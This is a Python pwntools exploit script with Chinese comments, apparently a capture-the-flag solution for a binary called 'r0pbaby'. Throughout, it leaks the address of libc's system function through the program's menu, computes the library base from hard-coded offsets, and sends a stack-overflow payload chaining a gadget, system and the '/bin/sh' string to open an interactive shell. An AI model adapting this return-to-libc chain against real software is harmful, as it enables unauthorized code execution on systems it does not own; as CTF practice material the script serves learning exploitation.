from pwn import *

# 通过 ida / ROPgadget 解析 `libc.so.6` 动态链接库得到
# ppc, system_addr, sh 的偏移
ppc_addr_offset = 0x107cb0
system_addr_offset = 0x49990
sh_addr_offset = 0x19704F

p = process('./r0pbaby')

# 选择 `Get address of a libc function`
p.recvuntil(b": ")
p.sendline(b"2")

# 获得动态链接的 symbol `system` 的地址
p.recvuntil(b": ")
p.sendline(b"system")

# 取出 symbol `system` 的地址文本，并转化为内存地址
system_addr = p.recvlineS().split(": ")[1].strip("\n")
system_addr = int(system_addr, 16)

# 计算链接库基地址, 从而能依据偏移得到 `/bin/sh` 以及 `ppc` 的地址
system_base_addr = system_addr - system_addr_offset
sh_addr = system_base_addr + sh_addr_offset
ppc_addr = system_base_addr + ppc_addr_offset

print("system_base_addr: %x" % system_base_addr)
print("sh_addr: %x" % sh_addr)
print("ppc_addr: %x" % ppc_addr)

# 构造 payload, 用以向目标填充
payload = flat([b'A' * 8 , p64(ppc_addr), p64(system_addr), p64(sh_addr)])
length =  str(len(payload))

print("payload: %s" % payload)
print("length: %s" % length)

# 进行注入，使得栈溢出为目标状态
p.recvuntil(b": ")
p.sendline(b"3")
p.recvuntil(b": ")

p.sendline(length.encode())
p.sendline(payload)

# 打开交互式窗口
p.interactive()





